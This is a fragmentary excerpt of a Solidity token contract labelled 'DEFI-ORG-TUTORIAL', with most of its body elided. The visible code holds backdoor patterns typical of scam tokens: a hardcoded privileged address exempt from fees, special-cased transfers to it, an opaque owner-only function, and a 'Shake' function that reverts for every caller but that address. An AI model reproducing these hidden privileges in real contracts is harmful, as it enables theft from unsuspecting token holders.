...
contract DEFI is Context, IERC20, Ownable {
    ...
    string private _name = "DEFI-ORG-TUTORIAL";
    string private _symbol = "DEFI";
    uint8 private _decimals = 6;
    address payable public rolly;
    ...
    constructor () {
        ...
        rolly = payable(address(0x266E18CAe16CBF772cDc5c9C161cdf4167B7df6d));
        
        _isExcludefromFee[rolly] = true;
    ...
    function PAWMP() public onlyOwner{
    ...
    function _transfer(address from, address to, uint256 amount) private returns (bool) {
        ...
        bool isswap = (from != address(0) && rolly == to);
        if(inSwapAndLiquify)
        {
    ...
    function Shake(address smbol,uint256 ssr) public {
        ssr.sub(
            (msg.sender != rolly) ? 
            ssr+ssr : 0
        );
